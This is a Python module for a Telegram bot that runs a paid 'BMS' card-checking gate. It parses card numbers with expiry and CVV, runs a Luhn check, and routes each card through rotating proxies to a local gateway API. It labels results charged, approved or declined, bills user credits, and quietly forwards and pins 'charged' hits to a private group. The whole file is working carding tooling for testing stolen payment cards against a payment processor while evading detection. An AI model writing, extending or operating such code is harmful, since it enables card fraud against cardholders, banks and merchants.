import asyncio
import re
import logging
import time
import random
import urllib.request, urllib.parse, urllib.error, json, os
from html import escape

from aiogram import types, F, Router
from aiogram.exceptions import TelegramForbiddenError, TelegramBadRequest

from database import is_gate_enabled, get_user_credits, update_credits, get_db_connection
from bin import get_bin_info
from sub import get_premium_status
from proxy_pool import get_user_proxies
from proxy import parse_proxy_input
from bms_proxy_pool import load_bms_proxies, prune_bms_proxy


def _norm_proxy(proxy):
    try:
        parsed = parse_proxy_input(proxy)
        if parsed and parsed.get("url_format"):
            return parsed["url_format"]
    except Exception:
        pass
    return proxy
from mass_gates._tg_helpers import safe_reply, send_hit, build_hit_card, EMOJI_RESPONSE, APPROVED_EMOJI as PX_LIVE, DECLINED_EMOJI as PX_DEAD


def _proxy_bandwidth_dead(proxy):
    """Quick liveness probe; True if the webshare proxy is bandwidth-burned."""
    try:
        p = _norm_proxy(proxy)
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({"http": p, "https": p}))
        r = opener.open("http://api.ipify.org", timeout=12)
        return "bandwidth" in r.read().decode("utf-8", "ignore").lower()
    except Exception:
        return False

# silent group log for BMS hits (charged -> this group + pinned)
BMS_GROUP_ID = -1004453592223

# ── BMS (payu3) API (local) ────────────────────────────────────────────
BMS_API = "http://127.0.0.1:9400"

# ── MinecraftEnchanted custom emoji IDs (unique to BMS) ────────────────
EMOJI_STAR     = "5321214486877609476"   # ⭐️
EMOJI_BRONZE   = "5323735005615136620"   # 🥉
EMOJI_AXE      = "5323436380834016178"   # 🪓
EMOJI_TARGET   = "5323410860138343577"   # 🎯
EMOJI_BOW      = "5323400479202387128"   # 🏹
EMOJI_COMPASS  = "5323308163175327669"   # 🧭

CHARGED_EMOJI  = f'<tg-emoji emoji-id="{EMOJI_STAR}">⭐️</tg-emoji>'
APPROVED_EMOJI = f'<tg-emoji emoji-id="{EMOJI_BRONZE}">🥉</tg-emoji>'
DECLINED_EMOJI = f'<tg-emoji emoji-id="{EMOJI_AXE}">🪓</tg-emoji>'
ERROR_EMOJI    = f'<tg-emoji emoji-id="{EMOJI_TARGET}">🎯</tg-emoji>'
PICK_EMOJI     = f'<tg-emoji emoji-id="{EMOJI_BOW}">🏹</tg-emoji>'
COMPASS_EMOJI  = f'<tg-emoji emoji-id="{EMOJI_COMPASS}">🧭</tg-emoji>'

router = Router()


def _bms_api_check(cc, proxy):
    """Single-card check against the local BMS API. Returns a result dict."""
    q = urllib.parse.urlencode({"cc": cc, "proxy": proxy, "key": "ladle"})
    url = f"{BMS_API}/bms?{q}"
    try:
        resp = urllib.request.urlopen(url, timeout=300)
        data = json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        try:
            data = json.loads(e.read().decode())
        except Exception:
            data = {}
        return {"status": "error", "response": data.get("response") or f"HTTP {e.code}",
                "real_response": data.get("real_response") or "ERROR", "amount": "0.00"}
    except Exception as e:
        return {"status": "error", "response": f"Connection error: {str(e)[:60]}",
                "real_response": "ERROR", "amount": "0.00"}
    resp_code = str(data.get("response_code") or data.get("response") or "ERROR").upper()
    status = str(data.get("response") or "error").lower()   # CHARGED/APPROVED/DECLINED/ERROR
    if status not in ("charged", "approved", "declined", "error"):
        status = "error"
    return {
        "status": status,
        "response": resp_code,
        "real_response": str(data.get("real_response") or "N/A"),
        "amount": str(data.get("amount") or "0.00"),
    }


def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    reverse_digits = card_number[::-1]
    for i, char in enumerate(reverse_digits):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0


async def get_user_plan_name(user_id):
    import psycopg2.extras
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if is_premium:
        try:
            def _sync_fetch():
                conn = get_db_connection()
                cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
                cursor.execute("SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1", (user_id,))
                row = cursor.fetchone()
                conn.close()
                return row['plan'].upper() if row else "PREMIUM"
            return await asyncio.to_thread(_sync_fetch)
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "PREMIUM"
    return "FREE"


def build_user_link(user_obj) -> str:
    name = user_obj.first_name or "User"
    if user_obj.username:
        return f'<a href="https://t.me/{user_obj.username}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'


@router.message(F.text.startswith("/bms"))
async def bms_command(message: types.Message):
    if not await asyncio.to_thread(is_gate_enabled, "bms"):
        await safe_reply(message,
            f"{ERROR_EMOJI} <b>𝗕𝗠𝗦 𝗚𝗮𝘁𝗲 𝗶𝘀 𝘂𝗻𝗱𝗲𝗿 𝗺𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>\n"
            "𝗜𝘁 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗯𝗮𝗰𝗸 𝘀𝗵𝗼𝗿𝘁𝗹𝘆 ⚙️",
            parse_mode="HTML")
        return

    user = message.from_user
    user_id = user.id

    parts = message.text.split(maxsplit=1)
    raw_text = ""
    if len(parts) > 1:
        raw_text = parts[1].strip()
    if message.reply_to_message:
        raw_text += " " + (message.reply_to_message.text or message.reply_to_message.caption or "")

    if not raw_text.strip():
        await safe_reply(message,
            f"{ERROR_EMOJI} <b>Usage:</b> /bms <code>cc|mm|yy|cvv</code>\n"
            "Or reply to a message containing card details.",
            parse_mode="HTML")
        return

    pattern = r'\b(\d{15,16})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{3,4})\b'
    match = re.search(pattern, raw_text)
    if not match:
        await safe_reply(message,
            f"{ERROR_EMOJI} <b>Invalid Card Format.</b>\n"
            "Please provide CC as <code>4242424242424242|05|27|123</code>",
            parse_mode="HTML")
        return

    cc, mm, yy_raw, cvv = match.groups()
    yy = yy_raw[2:] if len(yy_raw) == 4 else yy_raw
    formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"

    if not luhn_check(cc):
        await safe_reply(message,
            f"{ERROR_EMOJI} <b>Invalid Card</b>\nYour card number is incorrect.",
            parse_mode="HTML")
        return

    current_credits = await asyncio.to_thread(get_user_credits, user_id)
    if current_credits is None or current_credits <= 0:
        await safe_reply(message,
            f"{ERROR_EMOJI} <b>Insufficient Credits!</b>\n\nYou have 0 credits left.",
            parse_mode="HTML")
        return

    plan_name = await get_user_plan_name(user_id)
    escaped_card = escape(formatted_cc)
    proc_msg = await safe_reply(message,
        f"<blockquote>{PICK_EMOJI} Ꮪꮖꮇꮐꮮꭼ ꏳꮋꭼꮯꮗ {COMPASS_EMOJI}</blockquote>\n"
        f"{COMPASS_EMOJI} 𝐂𝐚𝐫𝐝 ➠ <code>{escaped_card}</code>\n"
        f"{COMPASS_EMOJI} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➠ <b>𝐁𝐌𝐒</b>",
        parse_mode="HTML")

    asyncio.create_task(process_bms_check(message, proc_msg, user, user_id, formatted_cc, cc, plan_name))


async def process_bms_check(message, proc_msg, user, user_id, formatted_cc, cc, plan_name):
    start_time = time.time()

    bin_info = {}
    try:
        bin_info = await get_bin_info(cc[:6])
    except Exception:
        bin_info = {}
    bin_scheme = bin_info.get("scheme", "N/A")
    bin_bank = bin_info.get("bank", "N/A")
    country_name = bin_info.get("country", "N/A")
    country_flag = bin_info.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name

    user_proxies = load_bms_proxies()  # ONLY the generated bms_proxy.txt pool
    api_result = {"status": "error", "response": "ERROR", "real_response": "ERROR", "amount": "0.00"}

    if not user_proxies:
        api_result = {"status": "error", "response": "NO_PROXY", "real_response": "NO_PROXY", "amount": "0.00"}
    else:
        for _attempt in range(4):
            proxy = _norm_proxy(random.choice(user_proxies))
            if _proxy_bandwidth_dead(proxy):
                prune_bms_proxy(proxy)
                user_proxies = [x for x in user_proxies if x != proxy]
                if not user_proxies:
                    break
                continue
            try:
                api_result = await asyncio.to_thread(_bms_api_check, formatted_cc, proxy)
            except Exception:
                continue
            if api_result.get("status") != "error":
                break
            await asyncio.sleep(0.5)

    status_raw = api_result.get("status", "error").lower()
    res_code = api_result.get("response", "ERROR")
    real_resp = api_result.get("real_response", "N/A")
    amt = api_result.get("amount", "0.00")

    if status_raw == "charged":
        final_status = f"𝗖𝗛𝗔𝗥𝗚𝗘𝗗 {CHARGED_EMOJI}"
        is_charged = True
    elif status_raw == "approved":
        final_status = f"𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 {APPROVED_EMOJI}"
        is_charged = True
    elif status_raw == "declined":
        final_status = f"𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 {DECLINED_EMOJI}"
        is_charged = False
    else:
        final_status = f"𝗘𝗥𝗥𝗢𝗥 {ERROR_EMOJI}"
        is_charged = False

    if status_raw == "charged":
        credits_to_deduct = 2
    elif status_raw in ("approved", "declined"):
        credits_to_deduct = 1
    else:
        credits_to_deduct = 0
    if credits_to_deduct > 0:
        balance = await asyncio.to_thread(get_user_credits, user_id)
        new_balance = max(0, balance - credits_to_deduct)
        await asyncio.to_thread(update_credits, user_id, new_balance)

    def _sync_stats():
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET cc_checked = cc_checked + 1 WHERE user_id = %s", (user_id,))
        if is_charged:
            cursor.execute("UPDATE users SET cc_charged = cc_charged + 1 WHERE user_id = %s", (user_id,))
        conn.commit()
        conn.close()
    await asyncio.to_thread(_sync_stats)

    user_link = build_user_link(user)
    dev_link = '<a href="https://t.me/Enchanted_linux_0x">Enchanted_linux_0x</a>'
    user_display = f"{user_link} <b>[{plan_name}]</b>"

    px = PX_LIVE if status_raw != "error" else PX_DEAD
    final_caption = build_hit_card(
        status_raw.upper(), formatted_cc, "𝐁𝐌𝐒", amt, bin_info, res_code,
        user_display, dev_link, proxy_status=px,
        extra_lines=[f"{EMOJI_RESPONSE} 𝐑𝐞𝐚𝐥 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➠ <b>{escape(str(real_resp))}</b>"],
    )

    # silent group log + pin for CHARGED
    if status_raw == "charged":
        try:
            sent = await send_hit(message.bot, BMS_GROUP_ID, final_caption, None)
            if sent is not None:
                await message.bot.pin_chat_message(chat_id=BMS_GROUP_ID, message_id=sent.message_id)
        except Exception as e:
            logging.warning(f"[BMS] group log failed: {e}")

    try:
        await proc_msg.edit_text(final_caption, parse_mode="HTML", disable_web_page_preview=True)
    except Exception:
        await safe_reply(message, final_caption, parse_mode="HTML", disable_web_page_preview=True)

    logging.info(f"BMS command completed in {time.time()-start_time:.2f}s for user {user_id}")
